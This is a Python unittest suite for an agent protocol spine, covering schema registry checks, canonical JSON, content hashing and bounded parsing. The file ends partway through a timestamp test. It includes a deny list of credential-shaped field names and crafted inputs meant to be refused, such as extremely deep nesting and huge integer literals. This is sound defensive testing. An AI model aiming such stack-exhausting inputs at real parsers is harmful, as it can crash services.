"""U-X1 protocol spine: canonical JSON, content hashing, registry, validator.

Contract: agentic-os-v0.3-u-x1-protocol-spine-contract.md

These tests exercise the real production branches and then inspect the
resulting state. They never assert on generic error wording — they assert on
the closed reason code — and they never assert that a refusal happened without
also proving that nothing was written, executed, opened or followed.
"""

from __future__ import annotations

import importlib.util
import json
import os
import shutil
import socket
import sqlite3
import stat
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path
from unittest import mock

REPO_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(REPO_ROOT))

from agentic_os import cli, ids, models, power, protocols  # noqa: E402
from agentic_os.utils import AosError  # noqa: E402

BUILDER_PATH = REPO_ROOT / "tools" / "build_zipapp.py"
GENERATOR_PATH = REPO_ROOT / "tools" / "gen_protocols.py"
ARTIFACT_ROOT = REPO_ROOT / "protocols"

PROTOCOL_LEAVES = (
    ("protocol", "list"),
    ("protocol", "show"),
    ("protocol", "validate"),
    ("protocol", "digest"),
    ("protocol", "verify-registry"),
)

TRACE = {
    "trace_id": "4bf92f3577b34da6a3ce929d0e0e4736",
    "correlation_id": "0f1e2d3c-4b5a-4998-8877-665544332211",
}


def _load_builder():
    spec = importlib.util.spec_from_file_location("aos_build_zipapp_x1", BUILDER_PATH)
    assert spec is not None and spec.loader is not None
    module = importlib.util.module_from_spec(spec)
    sys.modules[spec.name] = module
    spec.loader.exec_module(module)
    return module


def _clean_env(**overrides) -> dict:
    env = os.environ.copy()
    env.pop("PYTHONPATH", None)
    env.update(overrides)
    return env


def _run(argv, cwd, env=None) -> subprocess.CompletedProcess:
    return subprocess.run(
        argv, cwd=str(cwd), env=env or _clean_env(), capture_output=True,
        text=True, timeout=120,
    )


def seal(document: dict) -> dict:
    """Insert the correct content hash, exactly as a producer would."""
    body = {k: v for k, v in document.items() if k != protocols.CONTENT_HASH_FIELD}
    body[protocols.CONTENT_HASH_FIELD] = protocols.content_digest(body)
    return body


def work_spec(**overrides) -> dict:
    document = {
        "schema": "beast.work-spec/v1",
        "protocol_version": 1,
        "content_hash_alg": protocols.CONTENT_HASH_ALG,
        "created_at": "2026-07-15T09:00:00Z",
        "expires_at": "2026-07-16T09:00:00Z",
        "issuer": "aos.local",
        "audience": ["runtime.local"],
        "scope": {"project": "demo"},
        "trace": dict(TRACE),
        "idempotency_key": "ws-2026-07-15-0001",
        "aos_task_id": "T-0002",
        "runtime_task_uuid": "aaaaaaaa-bbbb-4ccc-8ddd-eeeeeeeeeeee",
        "data_classification": "internal",
        "permitted_destinations": ["local", "aos-ledger"],
        "work_spec_id": "11111111-2222-4333-8444-555555555555",
        "goal": "Add a bounded validator for the protocol spine.",
        "acceptance_criteria": ["Focused tests pass"],
        "expected_result": {
            "result_schema": "beast.result-envelope/v1",
            "evidence_kinds": ["test"],
            "min_evidence_count": 1,
        },
    }
    document.update(overrides)
    return seal(document)


def result_envelope(spec: dict | None = None, **overrides) -> dict:
    spec = spec or work_spec()
    document = {
        "schema": "beast.result-envelope/v1",
        "protocol_version": 1,
        "content_hash_alg": protocols.CONTENT_HASH_ALG,
        "created_at": "2026-07-15T10:00:00Z",
        "issuer": "runtime.local",
        "audience": ["aos.local"],
        "scope": {"project": "demo"},
        "trace": dict(TRACE),
        "idempotency_key": "re-2026-07-15-0001",
        "aos_task_id": "T-0002",
        "data_classification": "internal",
        "permitted_destinations": ["aos-ledger"],
        "result_id": "99999999-8888-4777-8666-555555555555",
        "work_spec_id": spec["work_spec_id"],
        "work_spec_sha256": spec[protocols.CONTENT_HASH_FIELD],
        "outcome": "success",
        "retryable": False,
        "attempt": 1,
        "evidence": [
            {
                "kind": "test",
                "ref": "tests/test_v03_protocol_spine.py",
                "claim": "The focused suite passes.",
                "provenance": "agent:claude-code",
            }
        ],
        "errors": [],
    }
    document.update(overrides)
    return seal(document)


def interrupt(subject: dict | None = None, **overrides) -> dict:
    subject = subject or work_spec()
    document = {
        "schema": "beast.interrupt/v1",
        "protocol_version": 1,
        "content_hash_alg": protocols.CONTENT_HASH_ALG,
        "created_at": "2026-07-15T09:30:00Z",
        "issuer": "runtime.local",
        "audience": ["aos.local"],
        "scope": {"project": "demo"},
        "trace": dict(TRACE),
        "idempotency_key": "int-2026-07-15-0001",
        "aos_task_id": "T-0002",
        "data_classification": "internal",
        "permitted_destinations": ["human-review"],
        "interrupt_id": "12121212-3434-4565-8787-909090909090",
        "subject_schema": subject["schema"],
        "subject_sha256": subject[protocols.CONTENT_HASH_FIELD],
        "kind": "approval_request",
        "reason": "The budget reference needs a human decision.",
    }
    document.update(overrides)
    return seal(document)


def to_bytes(document: dict) -> bytes:
    return json.dumps(document, indent=2).encode("utf-8")


class ReasonCase(unittest.TestCase):
    """Assert on the closed reason code, never on prose."""

    def assertRefuses(self, code, fn, *args, **kwargs):
        with self.assertRaises(protocols.ProtocolError) as caught:
            fn(*args, **kwargs)
        self.assertEqual(
            caught.exception.code, code, f"expected {code}, got {caught.exception.code}"
        )
        return caught.exception


# ---------------------------------------------------------------------------
# (1)(2)(3) Registry contents, stability, and the checked-in projection


class RegistryTests(ReasonCase):
    def test_registry_contains_exactly_the_six_required_v1_schemas(self):
        # U-K1/U-T1 added the two manifest schemas — the one versioned
        # registry change that unit's contract documents (§14).
        self.assertEqual(
            [entry.identity for entry in protocols.list_entries()],
            [
                "beast.agent-passport/v1",
                "beast.interrupt/v1",
                "beast.result-envelope/v1",
                "beast.skill-manifest/v1",
                "beast.tool-manifest/v1",
                "beast.work-spec/v1",
            ],
        )
        self.assertEqual(
            sorted(protocols.REQUIRED_IDENTITIES), sorted(protocols.REGISTRY)
        )

    def test_registry_ordering_and_digests_are_stable_in_process(self):
        first = [(e.identity, e.digest) for e in protocols.list_entries()]
        second = [(e.identity, e.digest) for e in protocols.list_entries()]
        self.assertEqual(first, second)
        self.assertEqual(protocols.verify_registry_digests(), [])

    def test_registry_digests_are_stable_across_processes_and_hash_seeds(self):
        """PYTHONHASHSEED randomizes set/str hashing. A digest that depended on
        iteration order anywhere would differ between these two runs."""
        code = (
            "from agentic_os import protocols;"
            "print(';'.join(f'{e.identity}={e.digest}' for e in "
            "protocols.list_entries()))"
        )
        outputs = set()
        for seed in ("0", "1", "12345"):
            env = _clean_env(PYTHONPATH=str(REPO_ROOT), PYTHONHASHSEED=seed)
            result = _run([sys.executable, "-c", code], REPO_ROOT, env)
            self.assertEqual(result.returncode, 0, result.stderr)
            outputs.add(result.stdout.strip())
        self.assertEqual(len(outputs), 1, f"digests varied by hash seed: {outputs}")
        expected = ";".join(
            f"{e.identity}={e.digest}" for e in protocols.list_entries()
        )
        self.assertEqual(outputs.pop(), expected)

    def test_checked_in_files_match_embedded_definitions_byte_for_byte(self):
        self.assertEqual(protocols.verify_source_artifacts(ARTIFACT_ROOT), [])
        for entry in protocols.list_entries():
            path = ARTIFACT_ROOT / entry.artifact_relpath
            self.assertEqual(path.read_bytes(), entry.canonical_bytes + b"\n")

    def test_checked_in_artifacts_end_with_exactly_one_newline(self):
        for relpath in protocols.expected_source_artifacts():
            data = (ARTIFACT_ROOT / relpath).read_bytes()
            self.assertTrue(data.endswith(b"\n"), relpath)
            self.assertFalse(data.endswith(b"\n\n"), relpath)

    def test_a_drifted_checkin_is_detected(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            for relpath, data in protocols.expected_source_artifacts().items():
                path = root / relpath
                path.parent.mkdir(parents=True, exist_ok=True)
                path.write_bytes(data)
            self.assertEqual(protocols.verify_source_artifacts(root), [])

            target = root / "beast.work-spec" / "v1.schema.json"
            target.write_bytes(target.read_bytes().replace(b"WorkSpec v1", b"WorkSpec 1"))
            problems = protocols.verify_source_artifacts(root)
            self.assertEqual(len(problems), 1)
            self.assertIn("beast.work-spec/v1.schema.json", problems[0])

    def test_a_stray_json_artifact_is_detected(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            for relpath, data in protocols.expected_source_artifacts().items():
                path = root / relpath
                path.parent.mkdir(parents=True, exist_ok=True)
                path.write_bytes(data)
            (root / "beast.rogue").mkdir()
            (root / "beast.rogue" / "v1.schema.json").write_bytes(b"{}\n")
            problems = protocols.verify_source_artifacts(root)
            self.assertEqual(len(problems), 1)
            self.assertIn("beast.rogue/v1.schema.json", problems[0])

    def test_generator_verify_mode_passes_and_writes_nothing(self):
        before = {
            p: p.read_bytes() for p in ARTIFACT_ROOT.rglob("*") if p.is_file()
        }
        result = _run([sys.executable, str(GENERATOR_PATH)], REPO_ROOT)
        self.assertEqual(result.returncode, 0, result.stderr)
        after = {p: p.read_bytes() for p in ARTIFACT_ROOT.rglob("*") if p.is_file()}
        self.assertEqual(before, after)

    def test_registry_index_is_deterministic_and_sorted(self):
        index = protocols.registry_index()
        identities = [row["identity"] for row in index["schemas"]]
        self.assertEqual(identities, sorted(identities))
        self.assertEqual(index["canonical_json"], protocols.CANONICAL_JSON)
        self.assertEqual(index["content_hash_alg"], protocols.CONTENT_HASH_ALG)


class RegistryRefusalTests(ReasonCase):
    """(contract §4.4) Every registry refusal, driven through the real builder."""

    def _schema(self, identity="x.thing/v1"):
        return {
            "type": "object",
            "additionalProperties": False,
            "required": ["schema"],
            "properties": {"schema": {"type": "string", "const": identity}},
            "$defs": {},
        }

    def test_duplicate_name_version_pair_refuses(self):
        definition = ("x.thing", 1, "active", self._schema())
        with self.assertRaises(protocols.RegistryError) as caught:
            protocols.build_registry((definition, definition))
        self.assertIn("duplicate", str(caught.exception))

    def test_duplicate_name_refuses(self):
        """Same name twice at the same major is a duplicate name AND a
        duplicate pair; both refusals must be reachable."""
        with self.assertRaises(protocols.RegistryError):
            protocols.build_registry(
                (
                    ("x.thing", 1, "active", self._schema()),
                    ("x.thing", 1, "deprecated", self._schema()),
                )
            )

    def test_malformed_schema_name_refuses(self):
        for bad in ("Beast.Thing", "beast", "beast..thing", "beast.thing/v1", "1x.y"):
            with self.subTest(name=bad):
                with self.assertRaises(protocols.RegistryError):
                    protocols.build_registry(((bad, 1, "active", self._schema()),))

    def test_unsupported_major_version_refuses(self):
        with self.assertRaises(protocols.RegistryError) as caught:
            protocols.build_registry((("x.thing", 2, "active", self._schema()),))
        self.assertIn("unsupported major", str(caught.exception))

    def test_ambiguous_aliasing_refuses(self):
        """Two identities differing only by case would answer to one reference."""
        with mock.patch.object(
            protocols, "_SCHEMA_NAME_RE", __import__("re").compile(r"^[A-Za-z.]+$")
        ):
            with self.assertRaises(protocols.RegistryError) as caught:
                protocols.build_registry(
                    (
                        ("x.thing", 1, "active", self._schema()),
                        ("X.Thing", 1, "active", self._schema()),
                    )
                )
        self.assertIn("ambiguous aliasing", str(caught.exception))

    def test_missing_required_schema_refuses(self):
        with self.assertRaises(protocols.RegistryError) as caught:
            protocols.build_registry((("x.thing", 1, "active", self._schema()),))
        self.assertIn("missing schema", str(caught.exception))

    def test_schema_that_does_not_pin_its_own_identity_refuses(self):
        with self.assertRaises(protocols.RegistryError) as caught:
            protocols.build_registry(
                (("x.thing", 1, "active", self._schema("x.other/v1")),)
            )
        self.assertIn("does not pin its own identity", str(caught.exception))

    def test_unknown_compatibility_status_refuses(self):
        with self.assertRaises(protocols.RegistryError):
            protocols.build_registry((("x.thing", 1, "experimental", self._schema()),))

    def test_digest_mismatch_is_detected(self):
        import dataclasses

        entry = protocols.REGISTRY["beast.work-spec/v1"]
        tampered = dataclasses.replace(entry, digest="0" * 64)
        with mock.patch.object(
            protocols, "REGISTRY", {"beast.work-spec/v1": tampered}
        ):
            problems = protocols.verify_registry_digests()
        self.assertEqual(len(problems), 1)
        self.assertIn("digest mismatch", problems[0])

    def test_canonical_byte_drift_is_detected(self):
        import dataclasses

        entry = protocols.REGISTRY["beast.work-spec/v1"]
        tampered = dataclasses.replace(entry, canonical_bytes=b"{}")
        with mock.patch.object(
            protocols, "REGISTRY", {"beast.work-spec/v1": tampered}
        ):
            problems = protocols.verify_registry_digests()
        self.assertIn("canonical bytes drifted", " ".join(problems))

    def test_registry_is_not_mutable_at_runtime(self):
        """No register(), no plugin hook, no workspace path adds a schema."""
        with self.assertRaises(TypeError):
            protocols.REGISTRY["evil/v1"] = None  # type: ignore[index]
        with self.assertRaises(TypeError):
            del protocols.REGISTRY["beast.work-spec/v1"]  # type: ignore[attr-defined]
        self.assertFalse(hasattr(protocols, "register"))
        self.assertFalse(hasattr(protocols, "register_schema"))
        self.assertEqual(len(protocols.REGISTRY), 6)


class SchemaLintTests(ReasonCase):
    """(contract §6.2) The registry cannot use a keyword the engine ignores."""

    def _wrap(self, properties, defs=None):
        return {
            "type": "object",
            "additionalProperties": False,
            "required": [],
            "properties": properties,
            "$defs": defs or {},
        }

    def test_every_unsupported_keyword_is_refused_in_a_registry_schema(self):
        for keyword in protocols.UNSUPPORTED_KEYWORDS:
            with self.subTest(keyword=keyword):
                schema = self._wrap({"f": {"type": "string", keyword: "x"}})
                with self.assertRaises(protocols.RegistryError) as caught:
                    protocols._lint_schema(schema, "x.thing/v1")
                self.assertIn(keyword, str(caught.exception))

    def test_supported_and_unsupported_keyword_sets_are_disjoint(self):
        self.assertEqual(
            protocols.SUPPORTED_KEYWORDS & set(protocols.UNSUPPORTED_KEYWORDS), set()
        )

    def test_shipped_schemas_use_only_supported_keywords(self):
        def walk(node):
            if isinstance(node, dict):
                for key in node:
                    if key in ("properties", "$defs"):
                        for sub in node[key].values():
                            walk(sub)
                    elif key == "items":
                        walk(node[key])
                    else:
                        self.assertIn(key, protocols.SUPPORTED_KEYWORDS, key)

        for entry in protocols.list_entries():
            walk(entry.schema)

    def test_missing_type_is_refused_not_treated_as_a_wildcard(self):
        with self.assertRaises(protocols.RegistryError) as caught:
            protocols._lint_schema(self._wrap({"f": {"minLength": 1}}), "x/v1")
        self.assertIn("explicit 'type'", str(caught.exception))

    def test_open_object_is_refused(self):
        schema = self._wrap({"f": {"type": "object", "properties": {}}})
        with self.assertRaises(protocols.RegistryError) as caught:
            protocols._lint_schema(schema, "x/v1")
        self.assertIn("additionalProperties=false", str(caught.exception))

    def test_non_false_additional_properties_is_refused(self):
        schema = self._wrap({"f": {"type": "object", "additionalProperties": {}}})
        with self.assertRaises(protocols.RegistryError):
            protocols._lint_schema(schema, "x/v1")

    def test_unanchored_pattern_is_refused(self):
        schema = self._wrap({"f": {"type": "string", "pattern": "[a-z]+"}})
        with self.assertRaises(protocols.RegistryError) as caught:
            protocols._lint_schema(schema, "x/v1")
        self.assertIn("anchored", str(caught.exception))

    def test_remote_ref_is_refused(self):
        schema = self._wrap({"f": {"$ref": "https://example.invalid/s.json"}})
        with self.assertRaises(protocols.RegistryError) as caught:
            protocols._lint_schema(schema, "x/v1")
        self.assertIn("local", str(caught.exception))

    def test_dangling_local_ref_is_refused(self):
        schema = self._wrap({"f": {"$ref": "#/$defs/Nope"}})
        with self.assertRaises(protocols.RegistryError) as caught:
            protocols._lint_schema(schema, "x/v1")
        self.assertIn("dangling", str(caught.exception))

    def test_ref_cycle_refuses_instead_of_looping(self):
        defs = {"A": {"$ref": "#/$defs/B"}, "B": {"$ref": "#/$defs/A"}}
        with self.assertRaises(protocols.RegistryError) as caught:
            protocols._resolve({"$ref": "#/$defs/A"}, defs)
        self.assertIn("bound", str(caught.exception))

    def test_credential_shaped_property_names_are_refused(self):
        for name in (
            "api_key", "apikey", "password", "token", "secret", "env",
            "env_vars", "access_key", "private_key", "session_id",
            "connection_string", "dsn", "bearer", "credentials",
        ):
            with self.subTest(name=name):
                schema = self._wrap({name: {"type": "string"}})
                with self.assertRaises(protocols.RegistryError) as caught:
                    protocols._lint_schema(schema, "x/v1")
                self.assertIn("credential-shaped", str(caught.exception))

    def test_legitimate_names_containing_secretish_substrings_are_allowed(self):
        """Segment-based, not substring: 'evidence' must not trip on 'env'."""
        for name in ("evidence", "environment_note_count", "authority"):
            with self.subTest(name=name):
                schema = self._wrap({name: {"type": "string"}})
                if name == "environment_note_count":
                    with self.assertRaises(protocols.RegistryError):
                        protocols._lint_schema(schema, "x/v1")
                else:
                    protocols._lint_schema(schema, "x/v1")

    def test_required_field_not_declared_as_a_property_is_refused(self):
        schema = {
            "type": "object",
            "additionalProperties": False,
            "required": ["ghost"],
            "properties": {"f": {"type": "string"}},
            "$defs": {},
        }
        with self.assertRaises(protocols.RegistryError) as caught:
            protocols._lint_schema(schema, "x/v1")
        self.assertIn("not a declared property", str(caught.exception))


# ---------------------------------------------------------------------------
# (4)(5)(6)(7)(8) Canonical JSON


class CanonicalSerializationTests(ReasonCase):
    def test_key_ordering_and_whitespace_are_deterministic(self):
        self.assertEqual(
            protocols.serialize_canonical({"b": 1, "a": 2, "C": 3}),
            b'{"C":3,"a":2,"b":1}',
        )
        self.assertEqual(
            protocols.serialize_canonical({"a": 2, "C": 3, "b": 1}),
            b'{"C":3,"a":2,"b":1}',
        )

    def test_nested_keys_sort_too_and_array_order_is_preserved(self):
        value = {"z": [{"b": 1, "a": 2}, {"d": 3, "c": 4}]}
        self.assertEqual(
            protocols.serialize_canonical(value),
            b'{"z":[{"a":2,"b":1},{"c":4,"d":3}]}',
        )

    def test_serialization_is_utf8_without_a_bom_and_not_ascii_escaped(self):
        data = protocols.serialize_canonical({"k": "café — ✓"})
        self.assertFalse(data.startswith(b"\xef\xbb\xbf"))
        self.assertEqual(data.decode("utf-8"), '{"k":"café — ✓"}')

    def test_user_strings_are_never_normalized_trimmed_or_case_folded(self):
        raw = "  Mixed CASE\twith\ttabs  "
        parsed = protocols.parse_canonical(json.dumps({"k": raw}).encode())
        self.assertEqual(parsed["k"], raw)
        round_tripped = protocols.parse_canonical(
            protocols.serialize_canonical(parsed)
        )
        self.assertEqual(round_tripped["k"], raw)

    def test_file_bytes_end_with_exactly_one_newline(self):
        data = protocols.serialize_canonical_file_bytes({"a": 1})
        self.assertEqual(data, b'{"a":1}\n')

    def test_the_trailing_newline_is_not_part_of_the_hashed_body(self):
        document = work_spec()
        body = {
            k: v for k, v in document.items() if k != protocols.CONTENT_HASH_FIELD
        }
        self.assertEqual(
            protocols.content_digest(document),
            __import__("hashlib").sha256(
                protocols.serialize_canonical(body)
            ).hexdigest(),
        )
        self.assertNotEqual(
            protocols.content_digest(document),
            __import__("hashlib").sha256(
                protocols.serialize_canonical_file_bytes(body)
            ).hexdigest(),
        )

    def test_serializer_refuses_a_float_before_encoding(self):
        self.assertRefuses(
            "float_not_permitted", protocols.serialize_canonical, {"a": 1.5}
        )

    def test_serializer_refuses_a_lone_surrogate(self):
        self.assertRefuses(
            "lone_surrogate", protocols.serialize_canonical, {"a": "\ud800"}
        )

    def test_serializer_refuses_an_unrepresentable_type(self):
        self.assertRefuses("wrong_type", protocols.serialize_canonical, {"a": {1, 2}})
        self.assertRefuses("wrong_type", protocols.serialize_canonical, {1: "a"})


class CanonicalParseRefusalTests(ReasonCase):
    def test_duplicate_keys_refuse(self):
        self.assertRefuses(
            "duplicate_key", protocols.parse_canonical, b'{"a":1,"a":2}'
        )

    def test_duplicate_keys_refuse_when_nested(self):
        self.assertRefuses(
            "duplicate_key", protocols.parse_canonical, b'{"o":{"a":1,"a":2}}'
        )

    def test_floats_refuse(self):
        for raw in (b'{"a":1.0}', b'{"a":1e2}', b'{"a":-0.5}', b'{"a":1.5E-3}'):
            with self.subTest(raw=raw):
                self.assertRefuses(
                    "float_not_permitted", protocols.parse_canonical, raw
                )

    def test_nan_and_infinity_refuse(self):
        for raw in (b'{"a":NaN}', b'{"a":Infinity}', b'{"a":-Infinity}'):
            with self.subTest(raw=raw):
                self.assertRefuses(
                    "non_finite_number", protocols.parse_canonical, raw
                )

    def test_invalid_utf8_refuses(self):
        self.assertRefuses(
            "invalid_utf8", protocols.parse_canonical, b'{"a":"\xff\xfe"}'
        )

    def test_lone_surrogate_via_escape_refuses(self):
        self.assertRefuses(
            "lone_surrogate", protocols.parse_canonical, b'{"a":"\\ud800"}'
        )
        self.assertRefuses(
            "lone_surrogate", protocols.parse_canonical, b'{"a":"\\udfff tail"}'
        )

    def test_a_valid_surrogate_pair_is_accepted(self):
        """The refusal must be for LONE surrogates, not for astral characters."""
        parsed = protocols.parse_canonical(b'{"a":"\\ud83d\\ude00"}')
        self.assertEqual(parsed["a"], "\U0001f600")

    def test_bom_refuses(self):
        self.assertRefuses(
            "bom_present", protocols.parse_canonical, b'\xef\xbb\xbf{"a":1}'
        )

    def test_trailing_content_refuses(self):
        self.assertRefuses(
            "trailing_content", protocols.parse_canonical, b'{"a":1} {"b":2}'
        )
        self.assertRefuses("trailing_content", protocols.parse_canonical, b'{"a":1}]')

    def test_non_object_top_level_refuses(self):
        for raw in (b"[1,2]", b'"text"', b"1", b"null", b"true"):
            with self.subTest(raw=raw):
                self.assertRefuses("not_an_object", protocols.parse_canonical, raw)

    def test_malformed_json_refuses(self):
        for raw in (b"{", b'{"a"}', b"", b"{'a':1}"):
            with self.subTest(raw=raw):
                self.assertRefuses("not_json", protocols.parse_canonical, raw)

    def test_leading_and_trailing_whitespace_is_accepted(self):
        """Input need not be canonical: canonical form is how a document is
        hashed, not how it must be typed."""
        self.assertEqual(protocols.parse_canonical(b'\n  {"a":1}\n '), {"a": 1})


class BoundsTests(ReasonCase):
    def test_total_bytes_bound_enforces(self):
        payload = b'{"a":"' + b"x" * protocols.MAX_ARTIFACT_BYTES + b'"}'
        self.assertRefuses("too_large", protocols.parse_canonical, payload)

    def test_a_document_at_the_byte_bound_is_accepted(self):
        filler = protocols.MAX_ARTIFACT_BYTES - len(b'{"a":""}')
        payload = b'{"a":"' + b"x" * filler + b'"}'
        self.assertEqual(len(payload), protocols.MAX_ARTIFACT_BYTES)
        self.assertRefuses("string_too_long", protocols.parse_canonical, payload)

    def test_depth_bound_enforces_before_recursion(self):
        deep = b'{"a":' * (protocols.MAX_DEPTH + 1) + b"1" + b"}" * (
            protocols.MAX_DEPTH + 1
        )
        self.assertRefuses("depth_exceeded", protocols.parse_canonical, deep)

    def test_depth_at_the_bound_is_accepted(self):
        levels = protocols.MAX_DEPTH
        ok = b'{"a":' * levels + b"1" + b"}" * levels
        self.assertIsInstance(protocols.parse_canonical(ok), dict)

    def test_extreme_depth_refuses_rather_than_crashing_the_interpreter(self):
        """The pre-scan exists so json.loads never gets to blow the C stack —
        a crash is exit 2, and this must be a refusal (exit 1).

        Bracket-only nesting, because it is the densest deep input the byte
        bound admits: 120k levels in 240k bytes, far past any recursion limit,
        yet still a well-formed document the size bound would let through.
        """
        levels = 120_000
        deep = b"[" * levels + b"]" * levels
        self.assertLess(len(deep), protocols.MAX_ARTIFACT_BYTES)
        self.assertRefuses("depth_exceeded", protocols.parse_canonical, deep)

    def test_brackets_inside_strings_do_not_count_toward_depth(self):
        payload = json.dumps({"a": "[[[[{{{{" * 100}).encode()
        self.assertIsInstance(protocols.parse_canonical(payload), dict)

    def test_object_member_bound_enforces(self):
        members = {f"k{i}": 1 for i in range(protocols.MAX_OBJECT_MEMBERS + 1)}
        self.assertRefuses(
            "too_many_members", protocols.parse_canonical, json.dumps(members).encode()
        )

    def test_array_length_bound_enforces(self):
        payload = json.dumps({"a": [1] * (protocols.MAX_ARRAY_ITEMS + 1)}).encode()
        self.assertRefuses("too_many_items", protocols.parse_canonical, payload)

    def test_string_length_bound_enforces(self):
        payload = json.dumps({"a": "x" * (protocols.MAX_STRING_CHARS + 1)}).encode()
        self.assertRefuses("string_too_long", protocols.parse_canonical, payload)

    def test_key_length_bound_enforces(self):
        payload = json.dumps({"x" * (protocols.MAX_STRING_CHARS + 1): 1}).encode()
        self.assertRefuses("string_too_long", protocols.parse_canonical, payload)

    def test_integer_bound_enforces(self):
        for value in (protocols.INT_MAX + 1, protocols.INT_MIN - 1):
            with self.subTest(value=value):
                self.assertRefuses(
                    "integer_out_of_range",
                    protocols.parse_canonical,
                    b'{"a":%d}' % value,
                )

    def test_integers_at_the_bound_are_accepted(self):
        for value in (protocols.INT_MAX, protocols.INT_MIN, 0):
            with self.subTest(value=value):
                self.assertEqual(
                    protocols.parse_canonical(b'{"a":%d}' % value)["a"], value
                )

    def test_absurd_integer_literal_refuses_before_int_conversion(self):
        """CPython's int-conversion limit is a crash; this must be a refusal."""
        payload = b'{"a":' + b"9" * 100_000 + b"}"
        self.assertRefuses("integer_out_of_range", protocols.parse_canonical, payload)


# ---------------------------------------------------------------------------
# (9)(10)(11)(12)(13)(14) Schema identity and structure


class SchemaIdentityTests(ReasonCase):
    def test_unknown_schema_refuses(self):
        for identity in ("nope.thing/v1", "beast.workspec/v1", "beast.work-spec"):
            with self.subTest(identity=identity):
                self.assertRefuses(
                    "unknown_schema",
                    protocols.validate_document,
                    dict(work_spec(), schema=identity),
                )

    def test_unsupported_major_version_refuses(self):
        self.assertRefuses(
            "unsupported_major",
            protocols.validate_document,
            dict(work_spec(), schema="beast.work-spec/v2"),
        )

    def test_missing_schema_field_refuses(self):
        document = work_spec()
        del document["schema"]
        self.assertRefuses("missing_field", protocols.validate_document, document)

    def test_get_entry_requires_a_full_identity_and_has_no_aliases(self):
        self.assertEqual(
            protocols.get_entry("beast.work-spec/v1").identity, "beast.work-spec/v1"
        )
        for alias in ("beast.work-spec", "beast.work-spec/latest", "BEAST.WORK-SPEC/V1"):
            with self.subTest(alias=alias):
                with self.assertRaises(protocols.ProtocolError):
                    protocols.get_entry(alias)

    def test_protocol_version_must_match_the_major_in_the_schema_name(self):
        self.assertRefuses(
            "version_identity_mismatch",
            protocols.validate_document,
            seal(dict(work_spec(), protocol_version=2)),
        )


class StructureTests(ReasonCase):
    def test_unknown_top_level_field_refuses(self):
        self.assertRefuses(
            "unknown_field", protocols.validate_document, seal(dict(work_spec(), x=1))
        )

    def test_unknown_nested_field_refuses(self):
        document = work_spec()
        document["scope"] = {"project": "demo", "rogue": "x"}
        self.assertRefuses("unknown_field", protocols.validate_document, seal(document))

    def test_no_extension_object_is_reserved_in_v1(self):
        """D-v0.3.9: there is no unvalidated pocket inside a signed body."""
        for field in ("ext", "extensions", "x-extra", "additional", "meta"):
            with self.subTest(field=field):
                self.assertRefuses(
                    "unknown_field",
                    protocols.validate_document,
                    seal(dict(work_spec(), **{field: {"a": 1}})),
                )

    def test_every_required_field_is_enforced(self):
        base = work_spec()
        required = protocols.REGISTRY["beast.work-spec/v1"].schema["required"]
        self.assertIn("goal", required)
        for field in required:
            if field == "schema":
                continue  # covered by SchemaIdentityTests
            with self.subTest(field=field):
                document = {k: v for k, v in base.items() if k != field}
                if field == protocols.CONTENT_HASH_FIELD:
                    self.assertRefuses(
                        "malformed_hash", protocols.validate_document, document
                    )
                elif field == "content_hash_alg":
                    self.assertRefuses(
                        "unknown_hash_alg", protocols.validate_document, document
                    )
                else:
                    self.assertRefuses(
                        "missing_field", protocols.validate_document, seal(document)
                    )

    def test_wrong_types_refuse(self):
        for field, value in (
            ("goal", 1),
            ("audience", "runtime.local"),
            ("acceptance_criteria", {"a": 1}),
            ("scope", "demo"),
            ("protocol_version", "1"),
        ):
            with self.subTest(field=field):
                self.assertRefuses(
                    "wrong_type",
                    protocols.validate_document,
                    seal(dict(work_spec(), **{field: value})),
                )

    def test_booleans_are_not_integers(self):
        """isinstance(True, int) is True in Python; the validator must not
        inherit that."""
        self.assertRefuses(
            "wrong_type",
            protocols.validate_document,
            seal(dict(work_spec(), protocol_version=True)),
        )

    def test_bounded_collections_enforce(self):
        self.assertRefuses(
            "too_short",
            protocols.validate_document,
            seal(dict(work_spec(), acceptance_criteria=[])),
        )
        self.assertRefuses(
            "too_long",
            protocols.validate_document,
            seal(dict(work_spec(), acceptance_criteria=[f"c{i}" for i in range(33)])),
        )
        self.assertRefuses(
            "too_long",
            protocols.validate_document,
            seal(dict(work_spec(), goal="x" * 4097)),
        )
        self.assertRefuses(
            "too_short",
            protocols.validate_document,
            seal(dict(work_spec(), goal="")),
        )

    def test_unique_items_enforce(self):
        self.assertRefuses(
            "not_unique",
            protocols.validate_document,
            seal(dict(work_spec(), audience=["aos.local", "aos.local"])),
        )

    def test_enum_and_const_mismatch_refuse(self):
        self.assertRefuses(
            "enum_mismatch",
            protocols.validate_document,
            seal(dict(work_spec(), data_classification="topsecret")),
        )
        document = work_spec()
        document["expected_result"]["result_schema"] = "beast.work-spec/v1"
        self.assertRefuses("const_mismatch", protocols.validate_document, seal(document))

    def test_integer_range_enforces(self):
        document = work_spec(retry={"max_attempts": 11})
        self.assertRefuses("out_of_range", protocols.validate_document, document)
        document = work_spec(retry={"max_attempts": 0})
        self.assertRefuses("out_of_range", protocols.validate_document, document)

    def test_pattern_fullmatch_refuses_a_trailing_newline(self):
        """D-v0.2.3's hole, closed by fullmatch rather than by \\Z."""
        self.assertRefuses(
            "pattern_mismatch",
            protocols.validate_document,
            seal(dict(work_spec(), issuer="aos.local\n")),
        )
        self.assertRefuses(
            "pattern_mismatch",
            protocols.validate_document,
            seal(dict(work_spec(), aos_task_id="T-0002\n")),
        )


class TimestampTests(ReasonCase):
    def test_expiry_before_creation_refuses(self):
        self.assertRefuses(
            "expires_before_created",
            protocols.validate_document,
            work_spec(created_at="2026-07-15T09:00:00Z", expires_at="2026-07-15T08:59:59Z"),
        )

    def test_equal_created_and_expires_is_accepted(self):
        protocols.validate_document(
            work_spec(created_at="2026-07-15T09:00:00Z", expires_at="2026-07-15T09:00:00Z")
        )

    def test_a_shaped_but_unreal_instant_refuses(self):
        for stamp in ("2026-02-30T00:00:00Z", "2026-13-01T00:00:00Z", "2026-07-15T25:00:00Z"):
            with self.subTest(stamp=stamp):
                self.assertRefuses(
                    "invalid_timestamp",
                    protocols.validate_document,
                    work_spec(created_at=stamp),
                )

    def test_non_utc_and_fractional_timestamps_refuse(self):
        for stamp in (
            "2026-07-15T09:00:00+01:00",
            "2026-07-15T09:00:00.123Z",
            "2026-07-15T09:00:00z",
